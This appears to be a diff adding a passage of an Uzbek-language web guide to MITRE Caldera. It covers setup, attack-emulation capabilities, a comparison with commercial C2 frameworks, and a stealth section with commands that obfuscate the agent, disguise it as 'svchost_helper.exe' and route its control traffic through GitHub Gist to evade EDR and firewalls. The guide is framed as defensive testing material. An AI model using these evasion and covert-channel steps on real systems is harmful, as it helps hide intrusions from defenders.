+                                <span class="text-[11px] font-mono text-slate-400 block">Parolni ko'rish joyi:</span>
+                                <code class="text-xs font-mono text-emerald-400">conf/local.yml</code> (avto-generatsiya qilingan)
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 2: Docker Install -->
+            <div id="install-tab-docker" class="hidden space-y-4">
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 space-y-4">
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <h3 class="text-base font-bold text-white">Docker orqali Izolyatsiyalangan O'rnatish</h3>
+                            <p class="text-xs text-slate-400">Tizimga ortiqcha kutubxonalar o'rnatmasdan, barcha plaginlar va kompilatorlar tayyor bo'lgan konteynerda ishlatish.</p>
+                        </div>
+                        <button onclick="copyCode('cmd-docker')" class="text-xs font-mono px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                    </div>
+                    <pre id="cmd-docker" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># 1. Repozitoriyani klonlash
+git clone https://github.com/mitre/caldera.git --recursive
+cd caldera
+
+# 2. Docker obrazini yig'ish (Windows agentlarini ham kompilatsiya qilish uchun WIN_BUILD=true)
+docker build --build-arg WIN_BUILD=true . -t caldera:server
+
+# 3. Konteynerni portlar bilan ishga tushirish
+# 8888 - HTTP/Web UI | 8443 - HTTPS | 7010 - TCP Raw Contact | 7012 - UDP Contact
+docker run -d --name mitre_caldera \
+  -p 8888:8888 \
+  -p 8443:8443 \
+  -p 7010:7010 \
+  -p 7012:7012/udp \
+  caldera:server
+
+# Parol va API kalitlarini logdan ko'rish:
+docker logs mitre_caldera | grep -A 15 "users:"</pre>
+                </div>
+            </div>
+
+            <!-- TAB 3: Production & SSL -->
+            <div id="install-tab-prod" class="hidden space-y-4">
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 space-y-4">
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <h3 class="text-base font-bold text-white">Xavfsiz Production Konfiguratsiyasi (<code class="text-amber-300">conf/local.yml</code> va SSL)</h3>
+                            <p class="text-xs text-slate-400">Hech qachon real tarmoqda <code class="text-red-400">--insecure</code> bayrog'i bilan ishlatmang! <code class="text-red-400">--insecure</code> ishlatilsa, standart <code class="text-slate-300">conf/default.yml</code> dagi ochiq (<code class="text-slate-300">admin:admin</code>) parol yoqilib qoladi.</p>
+                        </div>
+                        <button onclick="copyCode('cmd-prod')" class="text-xs font-mono px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                    </div>
+                    <pre id="cmd-prod" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># SSL plaginini yoqish (HTTPS orqali shifrlangan trafik uchun)
+# conf/local.yml faylini tahrirlang va plugins ro'yxatiga 'ssl' ni qo'shing:
+
+app.contact.http: http://0.0.0.0:8888
+app.contact.tcp: 0.0.0.0:7010
+app.contact.udp: 0.0.0.0:7012
+app.contact.websocket: 0.0.0.0:7013
+plugins:
+  - sandcat
+  - stockpile
+  - compass
+  - debrief
+  - ssl     # &lt;-- HTTPS (8443 port) avtomatik HAProxy orqali yoqiladi
+users:
+  red:
+    red_admin: SizningMaxfiyParolingiz_2026!
+  blue:
+    blue_admin: BlueTeamMaxfiyParoli_2026!</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 3: NIMALAR QILA OLADI (IMKONIYATLAR) -->
+        <section id="imkoniyatlar" class="space-y-8 scroll-mt-20">
+            <div class="border-b border-slate-800 pb-4">
+                <span class="text-xs font-mono uppercase tracking-wider text-emerald-400">03-Bo'lim // Funksional Imkoniyatlar</span>
+                <h2 class="text-2xl sm:text-3xl font-bold text-white mt-1">Caldera Nimalar Qila Oladi? (Asosiy Vazifalari)</h2>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Capability 1 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-red-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-mono font-bold">01</div>
+                    <h3 class="text-lg font-bold text-white">Avtonom Red Team va APT Emulyatsiyasi</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Haqiqiy kiber-jinoyatchi guruhlar (masalan: <strong class="text-slate-200">APT29, FIN6, Conti, Wizard Spider, Sandworm</strong>) qanday uslubda hujum qilsa, xuddi shu zanjirni qadam-baqadam avtomatik takrorlaydi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">MITRE CTID Plans</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Full Kill-Chain</span>
+                    </div>
+                </div>
+
+                <!-- Capability 2 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-cyan-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 font-mono font-bold">02</div>
+                    <h3 class="text-lg font-bold text-white">Avtomatik Lateral Movement (Tarmoq Bo'ylab Tarqalish)</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Birinchi zararlangan kompyuterdan tarmoqni skanerlaydi, Active Directory ma'lumotlarini oladi, parol yoki NTLM xeshlarni yig'adi va <strong class="text-slate-200">SMB, WinRM, WMI yoki SSH</strong> orqali boshqa serverlarga o'z agentini o'tkazadi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Pass-the-Hash</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">WinRM / PsExec</span>
+                    </div>
+                </div>
+
+                <!-- Capability 3 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-amber-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 font-mono font-bold">03</div>
+                    <h3 class="text-lg font-bold text-white">Privilege Escalation & Credential Dumping</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Tizimdagi noto'g'ri sozlamalar (Unquoted Service Paths, SUID binaries, UAC Bypass) orqali <code class="text-amber-300">SYSTEM</code> yoki <code class="text-amber-300">root</code> huquqini oladi hamda LSASS, SAM, <code class="text-amber-300">/etc/shadow</code> va brauzer parollarini tortib oladi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">T1003 OS Credential Dumping</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">UAC Bypass</span>
+                    </div>
+                </div>
+
+                <!-- Capability 4 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-purple-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 font-mono font-bold">04</div>
+                    <h3 class="text-lg font-bold text-white">Data Exfiltration (Ma'lumotlarni Sizdirish Simulyatsiyasi)</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Kompaniya ichidagi maxfiy hujjatlarni (<code class="text-purple-300">.docx, .xlsx, .pdf, .kdbx</code>) qidirib topadi, ularni bitta arxivga yig'adi, shifrlaydi va DLP tizimi sezish-sezmasligini tekshirish uchun tashqariga uzatadi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">DLP Sinovi</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Staged Exfil</span>
+                    </div>
+                </div>
+
+                <!-- Capability 5 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-emerald-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 font-mono font-bold">05</div>
+                    <h3 class="text-lg font-bold text-white">Purple Team & SOC/SIEM Validatsiyasi</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Yangi yozilgan Sigma/YARA/Snort qoidalarini va Splunk/Wazuh/QRadar/Elastic SIEM korrelyatsiyalarini real hujum orqali sinovdan o'tkazish. Qaysi hujumda signal (Alert) chiqqani va qaysi biri ko'rinmay qolganini aniqlaydi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Detection Engineering</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">EDR Benchmark</span>
+                    </div>
+                </div>
+
+                <!-- Capability 6 -->
+                <div class="bg-slate-900/75 border border-slate-800 rounded-2xl p-6 space-y-3 hover:border-blue-500/40 transition">
+                    <div class="w-10 h-10 rounded-lg bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400 font-mono font-bold">06</div>
+                    <h3 class="text-lg font-bold text-white">Avtomatik Tozalash (Cleanup / Teardown)</h3>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed">
+                        Haqiqiy zararli dasturlardan farqli o'laroq, Caldera har bir Ability ichida <code class="text-blue-300">cleanup</code> blokiga ega. Operatsiya tugagach, u o'zi yaratgan fayllar, reestr yozuvlari va foydalanuvchilarni avtomatik o'chirib, tizimni dastlabki holiga qaytaradi.
+                    </p>
+                    <div class="pt-2 flex flex-wrap gap-1.5">
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Safe Production Testing</span>
+                        <span class="text-[11px] font-mono bg-slate-800 text-slate-300 px-2 py-0.5 rounded">Auto-Rollback</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 4: CALDERA VS AN'ANAVIY C2 FRAMEWORKS -->
+        <section id="c2-farqi" class="space-y-6 scroll-mt-20">
+            <div class="border-b border-slate-800 pb-4">
+                <span class="text-xs font-mono uppercase tracking-wider text-purple-400">04-Bo'lim // Fundamental Farqlar</span>
+                <h2 class="text-2xl sm:text-3xl font-bold text-white mt-1">Caldera va An'anaviy C2 (Cobalt Strike, Sliver, Havoc, Mythic) Farqi Nimada?</h2>
+                <p class="text-sm text-slate-400 mt-2">Ko'pchilik Caldera-ni oddiy C2 deb o'ylaydi. Aslida Caldera C2 imkoniyatlariga ega bo'lsa-da, uning <strong class="text-white">falsafasi va ishlash mexanizmi</strong> klassik C2 tizimlaridan tubdan farq qiladi.</p>
+            </div>
+
+            <div class="overflow-x-auto rounded-2xl border border-slate-800 bg-slate-900/70 shadow-xl">
+                <table class="w-full text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-slate-800 bg-slate-950/80 text-xs font-mono uppercase text-slate-400">
+                            <th class="py-4 px-5">Mezon / Xususiyat</th>
+                            <th class="py-4 px-5 text-red-400">MITRE Caldera™ (Adversary Emulation)</th>
+                            <th class="py-4 px-5 text-cyan-400">An'anaviy C2 (Cobalt Strike, Sliver, Havoc, Brute Ratel)</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-slate-800/80 text-xs sm:text-sm">
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">Asosiy Maqsad</td>
+                            <td class="py-4 px-5 text-slate-300">Ilmiy aniqlikda <strong class="text-emerald-400">takrorlanuvchan (Deterministic)</strong> hujum ssenariylarini avtomatlashtirish va SOC/Blue Team himoyasini tekshirish.</td>
+                            <td class="py-4 px-5 text-slate-300">Red Team operatoriga nishon tarmog'ida yashirincha qo'lda (<strong class="text-cyan-400">Manual Post-Exploitation</strong>) ishlash va maksimal chuqur kirish imkonini berish.</td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">Boshqaruv Usuli</td>
+                            <td class="py-4 px-5 text-slate-300"><strong class="text-white">Avtonom (Hands-off):</strong> "Start Operation" bosilgach, Planner va Fact-Graph o'zi qaror qabul qilib, zanjirni oxirigacha yetkazadi (qo'lda ham ishlatsa bo'ladi).</td>
+                            <td class="py-4 px-5 text-slate-300"><strong class="text-white">Operatorga bog'liq (Human-in-the-loop):</strong> Har bir qadamni xaker yoki Red Team mutaxassisi konsolda o'zi tahlil qilib yozadi.</td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">Mantiqiy Qaror (AI / Logic)</td>
+                            <td class="py-4 px-5 text-slate-300">O'rnatilgan <strong class="text-amber-300">Fact-Graph &amp; Planners</strong> mavjud. Topilgan ma'lumotlarni bog'lab, talablarga (Requirements) mos keluvchi keyingi texnikani o'zi tanlaydi.</td>
+                            <td class="py-4 px-5 text-slate-300">Bunday avtonom mantiqiy yadro yo'q (faqat oddiy Aggressor/CoffLoader skriptlari orqali boshlang'ich buyruqlarni avtomatlashtirish mumkin).</td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">Standart Shovqin Darajasi (OPSEC)</td>
+                            <td class="py-4 px-5 text-slate-300">Standart holatda <span class="text-amber-400 font-medium">O'rtacha / Shovqinli</span>. Chunki Sandcat diskka tushishi va standart <code class="text-slate-300">cmd.exe / powershell.exe</code> chaqirishi mumkin (ammo sozlash orqali yashirin qilinadi).</td>
+                            <td class="py-4 px-5 text-slate-300"><span class="text-emerald-400 font-medium">Juda Yuqori OPSEC (Stealth-first):</span> BOF (Beacon Object Files), Indirect Syscalls, Sleep Masking, Call Stack Spoofing, In-memory execution standartda mavjud.</td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">MITRE ATT&CK Bog'liqligi</td>
+                            <td class="py-4 px-5 text-slate-300"><strong class="text-emerald-400">100% Native:</strong> Har bir Ability bevosita Tactic va Technique ID (masalan, <code class="text-amber-300">T1059.001</code>) bilan kodlangan.</td>
+                            <td class="py-4 px-5 text-slate-300">Qo'shimcha plagin yoki tashqi loglash vositalarisiz ATT&CK mapping avtomatik yuritilmaydi.</td>
+                        </tr>
+                        <tr class="hover:bg-slate-800/30 transition">
+                            <td class="py-4 px-5 font-semibold text-white">Tozalash (Cleanup)</td>
+                            <td class="py-4 px-5 text-slate-300"><strong class="text-emerald-400">Avtomatik:</strong> Operatsiya tugashi bilan barcha izlarni o'chirish skriptlari teskari tartibda ishga tushadi.</td>
+                            <td class="py-4 px-5 text-slate-300">Operator barcha tashlangan fayllar va o'zgarishlarni ro'yxatga olib, qo'lda tozalashi kerak.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- SECTION 5: SAMARADORLIGI VA BAHOLASH -->
+        <section id="samaradorlik" class="space-y-6 scroll-mt-20">
+            <div class="border-b border-slate-800 pb-4">
+                <span class="text-xs font-mono uppercase tracking-wider text-amber-400">05-Bo'lim // Tizim Samaradorligi</span>
+                <h2 class="text-2xl sm:text-3xl font-bold text-white mt-1">Caldera Samaradorligi Qanday? (Haqiqiy Ko'rsatkichlar)</h2>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                <!-- Left Metrics Bars -->
+                <div class="lg:col-span-7 bg-slate-900/70 border border-slate-800 rounded-2xl p-6 space-y-5">
+                    <h3 class="text-base font-bold text-white">Yo'nalishlar Bo'yicha Samaradorlik Ko'rsatkichi</h3>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <div class="flex justify-between text-xs sm:text-sm mb-1">
+                                <span class="font-medium text-slate-200">Purple Team &amp; SIEM/EDR Detection Testing (Qoidalarni tekshirish)</span>
+                                <span class="font-mono font-bold text-emerald-400">98% (Ideal)</span>
+                            </div>
+                            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                                <div class="bg-gradient-to-r from-emerald-500 to-cyan-400 h-full rounded-full" style="width: 98%"></div>
+                            </div>
+                            <p class="text-[11px] text-slate-400 mt-1">Bir xil hujumni 100 marta bir xil aniqlikda takrorlay oladi. SOC jamoasi o'zgarish kiritgach, natijani 5 daqiqada qayta tekshirish mumkin.</p>
+                        </div>
+
+                        <div>
+                            <div class="flex justify-between text-xs sm:text-sm mb-1">
+                                <span class="font-medium text-slate-200">Avtomatlashtirish &amp; Vaqtni Tejash (MTTR / Vaqt samaradorligi)</span>
+                                <span class="font-mono font-bold text-cyan-400">95% (Juda Yuqori)</span>
+                            </div>
+                            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                                <div class="bg-gradient-to-r from-cyan-500 to-blue-500 h-full rounded-full" style="width: 95%"></div>
+                            </div>
+                            <p class="text-[11px] text-slate-400 mt-1">Qo'lda 2-3 kun ketadigan 60 ta ATT&CK texnikasini tekshirish jarayonini Caldera 10-15 daqiqa ichida to'liq bajarib, PDF hisobot tayyorlaydi.</p>
+                        </div>
+
+                        <div>
+                            <div class="flex justify-between text-xs sm:text-sm mb-1">
+                                <span class="font-medium text-slate-200">Ichki Tarmoqda Harakatlanish (Post-Exploitation &amp; Lateral Movement)</span>
+                                <span class="font-mono font-bold text-amber-400">82% (Yuqori)</span>
+                            </div>
+                            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                                <div class="bg-gradient-to-r from-amber-500 to-orange-500 h-full rounded-full" style="width: 82%"></div>
+                            </div>
+                            <p class="text-[11px] text-slate-400 mt-1">Fact-parserlar to'g'ri yozilgan bo'lsa, tarmoq ichida avtonom ko'chib o'tish juda samarali ishlaydi.</p>
+                        </div>
+
+                        <div>
+                            <div class="flex justify-between text-xs sm:text-sm mb-1">
+                                <span class="font-medium text-slate-200">Zamonaviy EDR (CrowdStrike, SentinelOne, Defender ATP) ni Out-of-the-Box Aylanib O'tish</span>
+                                <span class="font-mono font-bold text-red-400">35% → 85% (Custom OPSEC bilan)</span>
+                            </div>
+                            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                                <div class="bg-gradient-to-r from-red-500 via-amber-400 to-emerald-400 h-full rounded-full" style="width: 75%"></div>
+                            </div>
+                            <p class="text-[11px] text-slate-400 mt-1">Standart Sandcat binari barcha EDR bazalarida bor (35%). Ammo quyidagi 6-bo'limda ko'rsatilgan <strong class="text-white">Obfuskatsiya, In-Memory va LOLBins</strong> qo'llanganda samaradorlik 85%+ ga chiqadi.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Practical Value -->
+                <div class="lg:col-span-5 bg-slate-900/70 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between space-y-4">
+                    <div class="space-y-3">
+                        <h3 class="text-base font-bold text-white">Nima Uchun Tashkilotlar Caldera-ni Tanlaydi?</h3>
+                        <ul class="space-y-3 text-xs sm:text-sm text-slate-300">
+                            <li class="flex items-start gap-2.5">
+                                <span class="text-emerald-400 font-bold mt-0.5">✓</span>
+                                <span><strong>100% Bepul va Open-Source:</strong> Tijoriy BAS (Breach and Attack Simulation) platformalari (masalan, AttackIQ, SafeBreach, Picus) yiliga $50,000–$150,000 turadi. Caldera esa shu vazifani mutlaqo bepul bajaradi.</span>
+                            </li>
+                            <li class="flex items-start gap-2.5">
+                                <span class="text-emerald-400 font-bold mt-0.5">✓</span>
+                                <span><strong>REST API v2 Avtomatizatsiyasi:</strong> CI/CD yoki har haftalik cron-job orqali Caldera-ni avtomatik ishga tushirib, kompaniya xavfsizligi pasaymaganini tekshirib turish mumkin.</span>
+                            </li>
+                            <li class="flex items-start gap-2.5">
+                                <span class="text-emerald-400 font-bold mt-0.5">✓</span>
+                                <span><strong>Boshqa C2 lar Bilan Birgalikda Ishlash:</strong> Caldera nafaqat ichki tizimni tekshiradi, balki boshlang'ich kirishdan so'ng <strong class="text-cyan-300">Sliver yoki Cobalt Strike</strong> beacon-ni yuklab berish uchun "Staging/Automation" vositasi sifatida ham ishlatiladi.</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 text-xs text-amber-200 leading-relaxed">
+                        <strong>Xulosa:</strong> Agar maqsad SOC/EDR ni sinash, Purple Team mashg'uloti o'tkazish yoki takrorlanuvchan APT ssenariylarini avtomatlashtirish bo'lsa — Caldera dunyodagi #1 vositadir.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 6: SHOVQINSIZ KIRISH VA OPSEC (STEALTH & EVASION) -->
+        <section id="opsec-stealth" class="space-y-8 scroll-mt-20">
+            <div class="border-b border-slate-800 pb-4">
+                <div class="inline-flex items-center gap-2 px-2.5 py-1 rounded bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono mb-2">
+                    MAXSUS TEXNIK TAHLIL // RED TEAM OPSEC
+                </div>
+                <h2 class="text-2xl sm:text-3xl font-bold text-white">Qanday Qilib Tizimga "Shovqinsiz" (Stealth) Kira Oladi va Ishlaydi?</h2>
+                <p class="text-sm text-slate-400 mt-2">
+                    Standart Caldera o'rnatilishi bilanoq ishlatilsa, Antivirus/EDR uni darhol ushlaydi. Lekin professional Red Team mutaxassislari Caldera-ni <strong class="text-emerald-400">shovqinsiz (Low-Noise / Stealth)</strong> rejimga o'tkazish uchun quyidagi 6 ta texnik usulni qo'llaydilar.
+                </p>
+            </div>
+
+            <!-- Why Default is Noisy vs How to make it Silent -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <!-- Why Default is Detected -->
+                <div class="bg-red-950/20 border border-red-500/30 rounded-2xl p-6 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-lg bg-red-500/20 text-red-400 flex items-center justify-center font-bold">!</div>
+                        <h3 class="text-base font-bold text-white">Nega Standart Caldera "Shovqinli" Hisoblanadi?</h3>
+                    </div>
+                    <ul class="space-y-2.5 text-xs sm:text-sm text-slate-300">
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-400 font-mono">1.</span>
+                            <span><strong>Statik Signaturalar:</strong> Standart <code class="text-red-300">sandcat.go</code> ichida <code class="text-red-300">"gocat"</code>, <code class="text-red-300">"54ndc47"</code> va GitHub yo'llari ochiq matnda yozilgan bo'lib, YARA va Defender ularni darhol taniydi.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-400 font-mono">2.</span>
+                            <span><strong>Diskka Fayl Yozish (Dropping to Disk):</strong> Standart buyruqda agent <code class="text-red-300">C:\Users\Public\splunkd.exe</code> kabi joyga saqlanadi — EDR fayl tizimi skaneri buni tekshiradi.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-400 font-mono">3.</span>
+                            <span><strong>Shubhali HTTP Headerlar:</strong> Agent yuklab olishda standart <code class="text-red-300">file:sandcat.go</code> va <code class="text-red-300">platform:windows</code> HTTP sarlavhalari IDS/Suricata tomonidan ushlanadi.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-400 font-mono">4.</span>
+                            <span><strong>Noisy TTPs (Shovqinli Buyruqlar):</strong> Stockpile ichidagi ko'p qobiliyatlar to'g'ridan-to'g'ri <code class="text-red-300">cmd.exe /c whoami</code> yoki <code class="text-red-300">powershell.exe -enc</code> ishga tushiradi (Sysmon Event ID 1 &amp; 4104).</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- How to Make it Stealthy -->
+                <div class="bg-emerald-950/20 border border-emerald-500/30 rounded-2xl p-6 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-bold">✓</div>
+                        <h3 class="text-base font-bold text-white">Shovqinsiz Kirish Uchun 6 Ta OPSEC Texnikasi</h3>
+                    </div>
+                    <ul class="space-y-2.5 text-xs sm:text-sm text-slate-300">
+                        <li class="flex items-start gap-2">
+                            <span class="text-emerald-400 font-mono">1.</span>
+                            <span><strong>Garble &amp; Dinamik Kompilyatsiya:</strong> Har bir yuklashda Go agentga tasodifiy xesh (<code class="text-emerald-300">-ldflags="-s -w"</code>) va <code class="text-emerald-300">garble</code> obfuskatori qo'llab, simvollarni butunlay o'chirish.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-emerald-400 font-mono">2.</span>
+                            <span><strong>Fileless / In-Memory Yuklash:</strong> Agentni diskka yozmasdan, PowerShell Reflective Loading, Donut shellcode yoki Linuxda <code class="text-emerald-300">memfd_create</code> orqali faqat RAM xotirada ishga tushirish.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-emerald-400 font-mono">3.</span>
+                            <span><strong>Yashirin C2 Kanallar (HTTPS / DNS / Gist):</strong> Ochiq 8888 port o'rniga Nginx Redirector + Cloudflare CDN (443 HTTPS) yoki <strong class="text-emerald-300">GitHub Gist C2</strong> kanalidan foydalanish (trafik faqat <code class="text-emerald-300">api.github.com</code> ga boradi!).</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-emerald-400 font-mono">4.</span>
+                            <span><strong>High Sleep + Jitter va LOLBins:</strong> Beacon vaqtini 300–900 soniyaga va Jitter'ni 20-40% ga qo'yish hamda <code class="text-emerald-300">whoami</code> o'rniga Native API / WMI / LOLBins buyruqlaridan foydalanish.</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Deep-Dive Technical Cards on Stealth Customization -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <!-- Code Block 1: Garble & Custom Sandcat Compilation -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-sm font-bold text-white">A) Sandcat Agentni Obfuskatsiya Qilish (AV/EDR Evasion)</span>
+                        <button onclick="copyCode('cmd-obfuscate')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                    </div>
+                    <p class="text-xs text-slate-400">Standart Go kompilatori barcha funksiya nomlarini binar ichida qoldiradi. <code class="text-emerald-400">garble</code> va <code class="text-emerald-400">-ldflags="-s -w"</code> yordamida "gocat" satrlarini almashtirib kompilatsiya qilsangiz, statik AV signaturalari butunlay ojiz qoladi:</p>
+                    <pre id="cmd-obfuscate" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># 1. Garble Go obfuskatorini o'rnatish
+go install mvdan.cc/garble@latest
+
+# 2. Sandcat manba kodidagi standart satrlarni o'zgartirish
+cd plugins/sandcat/gocat
+find . -type f -name "*.go" -exec sed -i 's/sandcat/winupdate_svc/g' {} +
+
+# 3. Debug ma'lumotlarisiz va literal shifrlash bilan yig'ish (Windows x64 uchun)
+GOOS=windows GOARCH=amd64 garble -literals -tiny -seed=random build \
+  -ldflags="-s -w -H=windowsgui -X main.key=MaxfiyKalit99" \
+  -o ../payloads/svchost_helper.exe sandcat.go</pre>
+                </div>
+
+                <!-- Code Block 2: GitHub Gist & DNS Tunneling Stealth C2 -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 space-y-3">
+                    <div class="flex items-center justify-between">
+                        <span class="text-sm font-bold text-white">B) Tarmoqda Ko'rinmaslik: GitHub Gist C2 va Nginx Redirector</span>
+                        <button onclick="copyCode('cmd-gist')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                    </div>
+                    <p class="text-xs text-slate-400">Nishon korxonada Firewall barcha notanish IP-larni bloklagan bo'lsa ham, <code class="text-cyan-300">api.github.com</code> deyarli har doim ochiq bo'ladi. Sandcat Gist C2 orqali buyruqlarni GitHub'dan o'qib, natijani shu yerga yozadi:</p>
+                    <pre id="cmd-gist" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># 1. Caldera local.yml ichida GitHub Tokenni kiritish:
+app.contact.gist: GH_PERSONAL_ACCESS_TOKEN_SHU_YERGA
+
+# 2. Agentni HTTP emas, faqat GIST protokoli bilan kompilatsiya qilish:
+GOOS=linux GOARCH=amd64 go build \
+  -ldflags="-s -w -X main.c2Name=GIST -X main.c2Key=GH_PERSONAL_ACCESS_TOKEN" \
+  -o sandcat-gist sandcat.go
+
+# Natija: Nishon kompyuter sizning C2 IP manzilingizga UMUMAN ulanmaydi!
+# Barcha aloqa qonuniy TLS 1.3 orqali api.github.com bilan amalga oshadi.</pre>
+                </div>
+            </div>
+
+            <!-- INTERACTIVE STEALTH AGENT BUILDER & OPSEC SIMULATOR -->
+            <div class="bg-gradient-to-b from-slate-900 to-[#0b111e] border border-emerald-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl glow-emerald">
+                <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-b border-slate-800 pb-5 mb-6">
+                    <div>
+                        <span class="text-xs font-mono uppercase text-emerald-400 font-semibold">Interaktiv OPSEC Konstruktor</span>
